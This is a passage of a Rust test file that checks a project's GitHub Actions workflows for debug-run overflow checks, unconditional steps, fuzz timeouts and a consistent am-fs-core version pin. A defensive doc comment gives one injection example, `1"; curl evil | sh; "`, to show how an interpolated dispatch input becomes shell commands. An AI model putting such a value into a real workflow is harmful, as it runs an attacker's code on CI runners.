                "{line}: the r is a value or the harness's, and the run is debug"
            );
        }
    }

    #[test]
    fn a_debug_run_quoted_in_a_comment_does_not_count() {
        let yaml = "\
jobs:
  test:
    steps:
      # Measured on this branch:
      #     EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib   ->  EXIT=101
      - run: cargo test --locked --release
";
        assert_eq!(
            checking_debug_runs(yaml),
            Vec::<String>::new(),
            "a debug command quoted inside a comment is documentation, not a run"
        );
    }

    #[test]
    fn a_real_checking_debug_run_counts() {
        let yaml = "\
jobs:
  test:
    steps:
      - run: cargo test --locked --release
      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib
";
        assert_eq!(
            checking_debug_runs(yaml),
            vec!["- run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib".to_string()],
        );
    }

    /// A debug step present but never asked to check anything buys
    /// nothing over deleting it -- the whole point of the handshake.
    #[test]
    fn a_debug_run_without_the_handshake_does_not_count() {
        let yaml = "      - run: cargo test --locked --lib\n";
        assert_eq!(
            checking_debug_runs(yaml),
            Vec::<String>::new(),
            "the step runs but nothing checks the build it produced"
        );
    }

    /// A handshake on a release run proves nothing: the checks are
    /// legitimately off there.
    #[test]
    fn the_handshake_on_a_release_run_does_not_count() {
        let yaml = "      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --release\n";
        assert_eq!(checking_debug_runs(yaml), Vec::<String>::new());
    }

    /// An inline trailing comment naming `--release` must not disqualify
    /// a genuine debug run.
    #[test]
    fn a_trailing_comment_naming_release_does_not_disqualify_a_debug_run() {
        let yaml =
            "      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib  # deliberately not --release\n";
        assert_eq!(
            checking_debug_runs(yaml),
            vec!["- run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --lib".to_string()],
        );
    }

    /// A STEP THAT RUNS NO COMMAND MAY BE CONDITIONAL (#264).
    ///
    /// `actions/upload-artifact` has no `run:`. It cannot pass, cannot
    /// mask a failure and cannot make a red job green — and without
    /// `if: always()` GitHub skips it whenever an earlier step failed,
    /// which is the only time keeping the log is worth anything. The
    /// blanket ban made the quiet suite's logs unkeepable on exactly
    /// the runs that need them.
    fn check_job(steps: &str) {
        let text = format!(
            "on:\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n{steps}"
        );
        let document = super::load_document(&text, std::path::Path::new("synthetic.yml"));
        let job = super::job(&document, "test", std::path::Path::new("synthetic.yml"));
        super::assert_unconditional(job, "test", "ci.yml");
    }

    #[test]
    fn a_step_that_runs_nothing_may_carry_a_condition() {
        check_job(
            "      - uses: actions/upload-artifact@v4\n        if: always()\n        with:\n          name: logs\n",
        );
    }

    #[test]
    #[should_panic(expected = "must not be conditional")]
    fn a_step_that_runs_a_command_may_not() {
        check_job("      - run: cargo test --locked --release\n        if: always()\n");
    }

    /// And `continue-on-error:` stays refused whatever the step is: on
    /// an upload it says a failed upload does not matter, which is a
    /// different claim from "run this even after a failure".
    #[test]
    #[should_panic(expected = "continue-on-error")]
    fn a_step_that_runs_nothing_may_still_not_be_allowed_to_fail() {
        check_job("      - uses: actions/upload-artifact@v4\n        continue-on-error: true\n");
    }

    /// A profile named another way still disqualifies the run.
    #[test]
    fn a_profile_flag_disqualifies_a_run_even_with_the_handshake() {
        let yaml =
            "      - run: EXPECT_OVERFLOW_CHECKS=1 cargo test --locked --profile release-with-debug --lib\n";
        assert_eq!(checking_debug_runs(yaml), Vec::<String>::new());
    }
}

// ---------------------------------------------------------------- dispatch inputs

/// Every `${{ ... }}` expression in `run` that reads a workflow input.
///
/// GitHub substitutes an expression into a `run:` script BEFORE the shell
/// sees it, so an input quoted there is not a shell string: `"${{
/// inputs.seconds }}"` given `1"; curl evil | sh; "` is three commands.
/// An input reaches a step safely only through `env:`, where the shell
/// receives it as a variable's value and never parses it (#304).
fn inputs_interpolated(run: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut rest = run;
    while let Some(open) = rest.find("${{") {
        let after = &rest[open + 3..];
        let Some(close) = after.find("}}") else {
            break;
        };
        let expression = after[..close].trim();
        if expression
            .split(|c: char| !(c.is_alphanumeric() || c == '.' || c == '_'))
            .any(|word| word.starts_with("inputs.") || word.starts_with("github.event.inputs."))
        {
            found.push(format!("${{{{ {expression} }}}}"));
        }
        rest = &after[close + 2..];
    }
    found
}

/// Every step of every job in `workflow` whose `run:` interpolates an input.
///
/// A job that calls a reusable workflow (a job-level `uses:`) has no
/// steps here and runs no shell of its own: its `with:` values are
/// passed as inputs, not pasted into a script, so it is not scanned.
fn steps_interpolating_inputs(workflow: &str, path: &Path) -> Vec<String> {
    let document = load_document(workflow, path);
    let Some(jobs) = field(&document, "jobs").and_then(Yaml::as_mapping) else {
        panic!("{} has no jobs", path.display());
    };
    let mut offending = Vec::new();
    for (name, job) in jobs {
        let name = name.as_str().unwrap_or("?");
        if field(job, "uses").is_some() {
            continue;
        }
        for step in steps_of(job, name) {
            for expression in inputs_interpolated(run_of(step)) {
                offending.push(format!("jobs.{name}: {expression}"));
            }
        }
    }
    offending
}

/// No workflow pastes a dispatch input into a shell script (#304).
///
/// Every workflow, not only fuzz.yml: the next `workflow_dispatch` input
/// added anywhere is the same injection.
#[test]
fn no_run_step_interpolates_a_workflow_input() {
    let dir = manifest_dir().join(".github").join("workflows");
    let entries =
        std::fs::read_dir(&dir).unwrap_or_else(|e| panic!("cannot list {}: {e}", dir.display()));
    let mut read = 0;
    let mut offending = Vec::new();
    for entry in entries {
        let path = entry.expect("a directory entry").path();
        if path.extension().and_then(|e| e.to_str()) != Some("yml") {
            continue;
        }
        read += 1;
        for hit in steps_interpolating_inputs(&read_or_panic(&path), &path) {
            offending.push(format!("{}: {hit}", path.display()));
        }
    }
    assert!(read > 0, "no workflows found under {}", dir.display());
    assert!(
        offending.is_empty(),
        "these run: steps paste a workflow input into the shell, so whoever can \
         dispatch the workflow can run commands on the runner. Pass the input \
         through the step's env: and read it as a variable instead:\n{}",
        offending.join("\n")
    );
}

/// The job's time limit in seconds, and the fuzzing budget
/// `scripts/fuzz-all.sh` enforces.
fn fuzz_budgets() -> (u64, u64) {
    let path = workflow_path("fuzz.yml");
    let workflow = read_or_panic(&path);
    let document = load_document(&workflow, &path);
    let timeout = field(job(&document, "fuzz", &path), "timeout-minutes")
        .and_then(Yaml::as_integer)
        .unwrap_or_else(|| panic!("{} jobs.fuzz has no timeout-minutes", path.display()));
    let script = read_or_panic(&manifest_dir().join("scripts").join("fuzz-all.sh"));
    let budget = script
        .lines()
        .find_map(|l| l.trim().strip_prefix("total_budget="))
        .and_then(|v| v.trim().parse::<u64>().ok())
        .expect("scripts/fuzz-all.sh sets total_budget=<seconds>");
    (
        u64::try_from(timeout).expect("a positive timeout") * 60,
        budget,
    )
}

/// The fuzzing budget leaves room inside the job's timeout for the build
/// and the reproducer upload, so a dispatch can never run the job into
/// its timeout with a finding still on the runner (#304).
#[test]
fn the_fuzz_budget_fits_inside_the_fuzz_jobs_timeout() {
    let (timeout, budget) = fuzz_budgets();
    // Building cargo-fuzz uncached, and each target under the sanitizer,
    // is most of half an hour on a GitHub runner.
    let headroom = 30 * 60;
    assert!(
        budget + headroom <= timeout,
        "scripts/fuzz-all.sh allows {budget}s of fuzzing, which with {headroom}s for \
         the builds does not fit fuzz.yml's {timeout}s timeout"
    );
}

/// The reproducers are kept when the run is cancelled or times out, not
/// only when a step fails: a run stopped at its timeout still holds every
/// crash the earlier targets found (#304).
#[test]
fn the_fuzz_reproducers_are_kept_on_a_cancelled_run() {
    let path = workflow_path("fuzz.yml");
    let workflow = read_or_panic(&path);
    let document = load_document(&workflow, &path);
    let fuzz = job(&document, "fuzz", &path);
    let upload = steps_of(fuzz, "fuzz")
        .iter()
        .find(|s| is_artifact_step(s, "upload-artifact", "fuzz-artifacts"))
        .unwrap_or_else(|| panic!("{} uploads no fuzz-artifacts", path.display()));
    let condition = field(upload, "if").and_then(Yaml::as_str).unwrap_or("");
    let words: String = condition.split_whitespace().collect();
    assert!(
        words.contains("failure()") && words.contains("cancelled()"),
        "{}: the fuzz-artifacts upload runs on `{condition}`; it must run on \
         `failure() || cancelled()`, or a timed-out run throws its reproducers away",
        path.display()
    );
}

mod dispatch_inputs {
    use super::{inputs_interpolated, steps_interpolating_inputs};
    use std::path::Path;

    /// A job that calls a reusable workflow has no `steps:`; the scan
    /// passes over it and still reports the job after it (#485).
    #[test]
    fn a_reusable_workflow_call_is_passed_over_and_the_next_job_still_checked() {
        let workflow = "\
on: workflow_dispatch
jobs:
  cli:
    uses: owner/repo/.github/workflows/release-cli.yml@0123456789abcdef0123456789abcdef01234567
    with:
      version: ${{ inputs.x }}
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ inputs.x }}
";
        assert_eq!(
            steps_interpolating_inputs(workflow, Path::new("call.yml")),
            vec!["jobs.build: ${{ inputs.x }}"]
        );
    }

    /// A job with neither `steps:` nor a job-level `uses:` is malformed,
    /// and the scan still refuses it rather than passing over it (#485).
    #[test]
    #[should_panic(expected = "jobs.broken has no steps")]
    fn a_job_with_no_steps_and_no_uses_still_fails() {
        let workflow = "\
on: workflow_dispatch
jobs:
  broken:
    runs-on: ubuntu-latest
";
        steps_interpolating_inputs(workflow, Path::new("broken.yml"));
    }

    #[test]
    fn an_input_in_a_run_script_is_found() {
        assert_eq!(
            inputs_interpolated("./scripts/fuzz-all.sh \"${{ inputs.seconds || '120' }}\""),
            vec!["${{ inputs.seconds || '120' }}"]
        );
        assert_eq!(
            inputs_interpolated("echo ${{github.event.inputs.x}}"),
            vec!["${{ github.event.inputs.x }}"]
        );
    }

    #[test]
    fn other_expressions_and_env_reads_are_not() {
        assert!(inputs_interpolated("./scripts/fuzz-all.sh \"$SECONDS_PER_TARGET\"").is_empty());
        assert!(inputs_interpolated("echo ${{ matrix.os }} ${{ runner.arch }}").is_empty());
        assert!(inputs_interpolated("echo ${{ steps.myinputs.outputs.x }}").is_empty());
    }
}

/// The #306 rule, proved on small workflows rather than the real one.
mod tier_log_uploads {
    use super::unguarded_log_uploads as unguarded;

    const CHORES: &str = "\
tasks:
  lint:
    cmds: ['cargo fmt --check']
  test:unit:
    cmds: ['scripts/tier.sh test:unit unit 1 1 -- cargo test']
  test:
    cmds:
      - task: test:unit
";

    fn job(steps: &str) -> String {
        format!(
            "on:\n  pull_request:\njobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n{steps}"
        )
    }

    fn upload(condition: &str, missing: &str) -> String {
        format!(
            "      - uses: actions/upload-artifact@v4\n        if: {condition}\n        with:\n          \
             name: logs\n          path: tmp/logs/*.log\n          if-no-files-found: {missing}\n"
        )
    }

    const TIER: &str =
        "      - run: chore lint\n        id: lint\n      - run: chore test\n        id: tier\n";

    #[test]
    fn always_alone_is_reported() {
        let found = unguarded(
            &job(&format!("{TIER}{}", upload("always()", "error"))),
            CHORES,
        );
        assert_eq!(found.len(), 1, "{found:?}");
    }

    #[test]
    fn waiting_for_the_tier_passes() {
        for condition in [
            "always() && steps.tier.outcome != 'skipped'",
            "${{ always() && steps.tier.conclusion != 'skipped' }}",
        ] {
            let found = unguarded(
                &job(&format!("{TIER}{}", upload(condition, "error"))),
                CHORES,
            );
            assert_eq!(found, Vec::<String>::new(), "{condition}");
        }
    }

    /// Lint writes no log, so it having run proves nothing is there.
    #[test]
    fn waiting_for_a_step_that_writes_no_log_is_reported() {
        let condition = "always() && steps.lint.outcome != 'skipped'";
        let found = unguarded(
            &job(&format!("{TIER}{}", upload(condition, "error"))),
            CHORES,
        );
        assert_eq!(found.len(), 1, "{found:?}");
    }

    /// A step after the upload cannot have filled the path it reads.
    #[test]
    fn waiting_for_a_later_step_is_reported() {
        let condition = "always() && steps.tier.outcome != 'skipped'";
        let found = unguarded(
            &job(&format!("{}{TIER}", upload(condition, "error"))),
            CHORES,
        );
        assert_eq!(found.len(), 1, "{found:?}");
    }

    /// `chore test` reaches its tiers by re-entering chore, as the real
    /// chores.yml does, not through a `task:` item.
    #[test]
    fn a_tier_reached_by_re_entering_chore_counts() {
        let chores = "\
tasks:
  lint:
    cmds: ['cargo fmt --check']
  test:unit:
    cmds: ['scripts/tier.sh test:unit unit 1 1 -- cargo test']
  test:
    cmds:
      - |
        set -eu
        \"{{.CHORE_EXE}}\" test:unit
";
        let condition = "always() && steps.tier.outcome != 'skipped'";
        let found = unguarded(
            &job(&format!("{TIER}{}", upload(condition, "error"))),
            chores,
        );
        assert_eq!(found, Vec::<String>::new());
    }

    #[test]
    fn an_upload_that_tolerates_an_empty_path_or_has_no_condition_is_not_reported() {
        let warn = unguarded(
            &job(&format!("{TIER}{}", upload("always()", "warn"))),
            CHORES,
        );
        assert_eq!(warn, Vec::<String>::new());
        let plain = format!(
            "{TIER}      - uses: actions/upload-artifact@v4\n        with:\n          name: logs\n          \
             path: tmp/logs/*.log\n          if-no-files-found: error\n"
        );
        assert_eq!(unguarded(&job(&plain), CHORES), Vec::<String>::new());
    }
}

/// Which `am-fs-core` this crate is built against, as stated in one file.
///
/// Four spellings, because the pin is a dependency version in a
/// manifest, a resolved version in a lockfile, a `FS_CORE_REF` variable
/// in `chores.yml` or a workflow, and potentially an argument to
/// `git clone --branch`. All are returned normalised without the
/// leading `v`, paired with the spelling that produced them so a
/// failure names what to edit.
///
/// A comment is not a declaration. `chores.yml` explains its pin in
/// prose that names two versions, and a scan that read those would
/// report a disagreement nobody can fix.
///
/// A value that is not a literal version is not a declaration either:
/// `release.yml` clones `--branch "$(pin FS_CORE_REF)"`, which reads the
/// `chores.yml` variable and is not a second, independent pin.
fn am_fs_core_versions_declared(text: &str) -> Vec<(String, String)> {
    let mut found = Vec::new();
    let mut in_core_lock_entry = false;
    for line in text.lines() {
        let line = line.trim();
        if line.starts_with('#') {
            continue;
        }
        if line.starts_with("[[") || line.is_empty() {
            in_core_lock_entry = false;
        }
        if line == "name = \"am-fs-core\"" {
            in_core_lock_entry = true;
            continue;
        }
        if in_core_lock_entry && line.starts_with("version") {
            if let Some(v) = quoted_value_after(line, "version") {
                found.push((
                    "the lockfile's resolved am-fs-core `version`".to_string(),
                    v,
                ));
            }
            in_core_lock_entry = false;
            continue;
        }
        if line.starts_with("am-fs-core") {
            if let Some(v) = quoted_value_after(line, "version") {
                found.push(("the am-fs-core dependency's `version`".to_string(), v));
            }
        }
        if let Some(rest) = line.split_once("FS_CORE_REF:") {
            if let Some(v) = as_version(rest.1) {
                found.push(("`FS_CORE_REF`".to_string(), v));
            }
        }
        if line.contains("rust-fs-core") {
            if let Some(rest) = line.split_once("--branch ") {
                if let Some(v) = as_version(rest.1.split_whitespace().next().unwrap_or("")) {
                    found.push(("the `git clone --branch` ref".to_string(), v));
                }
            }
        }
    }
    found
}

/// The value of `key = "..."` on a line, if it is there.
fn quoted_value_after(line: &str, key: &str) -> Option<String> {
    let after = line.split_once(key)?.1;
    let after = after.trim_start().strip_prefix('=')?.trim_start();
    let inner = after.strip_prefix('"')?;
    let end = inner.find('"')?;
    Some(inner[..end].to_string())
}

/// `v0.2.13`, `"0.2.13"` and `0.2.13` are the same pin; `"$FS_CORE_REF"`
/// and `main` are not pins at all.
fn as_version(raw: &str) -> Option<String> {
    let t = raw.trim().trim_matches(|c| c == '"' || c == '\'');
    let t = t.strip_prefix('v').unwrap_or(t);
    let parts: Vec<&str> = t.split('.').collect();
    if parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()))
    {
        Some(t.to_string())
    } else {
        None
    }
}

/// Every file known to declare the pin, each exactly once.
///
/// A fixed list rather than a walk: the point is that each of these is
/// known to carry a pin, so one that stops carrying it is a failure
/// rather than a file the walk no longer visits. The workflows are
/// walked as well (see the guard), because none of them carries a pin
/// today -- `fuzz.yml` and `ci.yml` get the sibling through `chore
/// siblings`, `release.yml` reads `FS_CORE_REF` out of `chores.yml` --
/// and one that starts to must agree too.
const FILES_THAT_PIN_AM_FS_CORE: &[&str] = &[
    "Cargo.toml",
    "Cargo.lock",
    "fuzz/Cargo.toml",
    "fuzz/Cargo.lock",
    "chores.yml",
];

/// Every file that names the `am-fs-core` this crate is built against
/// names the same one.
///
/// `fuzz/Cargo.toml` said `0.2.10` (and `fuzz/Cargo.lock` resolved
/// 0.2.10) while `Cargo.toml`, `Cargo.lock` and `chores.yml` said
/// 0.2.13, and nothing compared them. It did not break the build,
/// because `version = "0.2.10"` is `^0.2.10` and 0.2.13 satisfies it,
/// so it would have stayed wrong silently until core reached 0.3 and
/// the fuzz build broke detached from the change that caused it (#366).
/// A sibling crate with the same drift in its fuzz workflow ran its
/// nightly fuzz red four nights running on an overflow core had
/// already fixed and shipped.
///
/// The count is asserted as well as the agreement. A scan that stopped
/// matching would otherwise report perfect agreement among nothing.
#[test]
fn every_declaration_of_the_am_fs_core_pin_names_the_same_version() {
    let root = manifest_dir();
    let mut declared: Vec<(String, String, String)> = Vec::new();
    let mut miscounted = Vec::new();

    for rel in FILES_THAT_PIN_AM_FS_CORE {
        let found = am_fs_core_versions_declared(&read_or_panic(&root.join(rel)));
        if found.len() != 1 {
            miscounted.push(format!("{rel}: {} declarations", found.len()));
        }
        for (spelling, version) in found {
            declared.push((rel.to_string(), spelling, version));
        }
    }

    assert!(
        miscounted.is_empty(),
        "each of FILES_THAT_PIN_AM_FS_CORE must declare the am-fs-core pin exactly \
         once, and these do not: {miscounted:?}. Either the pin moved somewhere this \
         guard does not read -- in which case update FILES_THAT_PIN_AM_FS_CORE -- or \
         the file stopped pinning the sibling and now builds against whatever is \
         checked out."
    );
    assert_eq!(
        declared.len(),
        FILES_THAT_PIN_AM_FS_CORE.len(),
        "the scan found {} am-fs-core declarations across the listed files, not {}",
        declared.len(),
        FILES_THAT_PIN_AM_FS_CORE.len(),
    );

    let workflows = root.join(".github/workflows");
    let mut entries: Vec<PathBuf> = std::fs::read_dir(&workflows)
        .unwrap_or_else(|e| panic!("cannot list {}: {e}", workflows.display()))
        .map(|e| e.expect("workflow dir entry").path())
        .filter(|p| p.extension().is_some_and(|x| x == "yml" || x == "yaml"))
        .collect();
    entries.sort();
    assert!(
        !entries.is_empty(),
        "found no workflows under {}: the walk that checks them for an am-fs-core pin \
         would check nothing",
        workflows.display()
    );
    for path in entries {
        let rel = path
            .strip_prefix(&root)
            .unwrap_or(&path)
            .display()
            .to_string();
        for (spelling, version) in am_fs_core_versions_declared(&read_or_panic(&path)) {
            declared.push((rel.clone(), spelling, version));
        }
    }

    let agreed = &declared[0].2;
    let disagreeing: Vec<String> = declared
        .iter()
        .filter(|(_, _, v)| v != agreed)
        .map(|(file, spelling, v)| format!("{file}: {spelling} says {v}"))
        .collect();
    assert!(
        disagreeing.is_empty(),
        "the am-fs-core pin disagrees across the files that declare it. \
         {}: {} says {agreed}, but {disagreeing:?}. A bump has to move every \
         one of them; the one left behind keeps building against a release \
         the rest of the crate has moved past, and nothing else says so.",
        declared[0].0,
        declared[0].1,
    );
}

mod core_pin_parser {
    use super::{am_fs_core_versions_declared, as_version};

    fn dep(v: &str) -> Vec<(String, String)> {
        vec![(
            "the am-fs-core dependency's `version`".to_string(),
            v.to_string(),
        )]
    }

    /// The real dependency line, in both manifests' shape.
    #[test]
    fn a_path_dependency_declares_its_version() {
        let toml = "am-fs-core = { path = \"../rust-fs-core\", version = \"0.2.13\" }\n";
        assert_eq!(am_fs_core_versions_declared(toml), dep("0.2.13"));
    }

    /// A lockfile's package entry declares the version it resolved; a
    /// dependency list naming the package does not.
    #[test]
    fn a_lockfile_entry_declares_its_version_and_a_dependency_list_does_not() {
        let lock = "[[package]]\nname = \"am-fs-core\"\nversion = \"0.2.10\"\n\n\
                    [[package]]\nname = \"am-fs-ext4\"\nversion = \"0.6.0\"\n\
                    dependencies = [\n \"am-fs-core\",\n]\n";
        assert_eq!(
            am_fs_core_versions_declared(lock),
            vec![(
                "the lockfile's resolved am-fs-core `version`".to_string(),
                "0.2.10".to_string()
            )],
        );
    }

    /// The `chores.yml` spelling, with and without the `v`.
    #[test]
    fn the_env_variable_declares_its_version() {
        assert_eq!(
            am_fs_core_versions_declared("  FS_CORE_REF: v0.2.13\n"),
            vec![("`FS_CORE_REF`".to_string(), "0.2.13".to_string())],
        );
    }

    /// The clone spelling, which is how a workflow would carry a pin of
    /// its own.
    #[test]
    fn a_clone_branch_declares_its_version() {
        let line = "run: git clone --depth 1 --branch v0.2.10 \
                    https://github.com/antimatter-studios/rust-fs-core.git ../rust-fs-core\n";
        assert_eq!(
            am_fs_core_versions_declared(line),
            vec![(
                "the `git clone --branch` ref".to_string(),
                "0.2.10".to_string()
            )],
        );
    }

    /// `chores.yml` explains its pin in prose naming versions. Reading
    /// those would report a disagreement with nothing to edit.
    #[test]
    fn a_comment_naming_a_version_is_not_a_declaration() {
        let yaml = "  # FS_CORE_REF: v0.2.11 is the first release that packages it\n  \
                    # am-fs-core = { version = \"0.2.10\" }\n";
        assert!(am_fs_core_versions_declared(yaml).is_empty());
    }

    /// `release.yml` clones `--branch "$(pin FS_CORE_REF)"`. That reads
    /// `chores.yml`, not a second pin, and counting it would make the
    /// guard unsatisfiable.
    #[test]
    fn a_branch_that_is_a_variable_is_not_a_declaration() {
        let line = "git clone --depth 1 --branch \"$(pin FS_CORE_REF)\" \
                    \"$(pin FS_CORE_URL)\" ../rust-fs-core\n";
        assert!(am_fs_core_versions_declared(line).is_empty());
    }

    /// A branch name is not a version. A pin moved to `main` is a pin
    /// abandoned, and the empty result makes its file miscounted, which
    /// the guard fails on separately.
    #[test]
    fn a_branch_name_is_not_a_version() {
        assert_eq!(as_version("main"), None);
        assert_eq!(as_version("v0.2"), None);
        assert_eq!(as_version("v0.2.13"), Some("0.2.13".to_string()));
    }
}
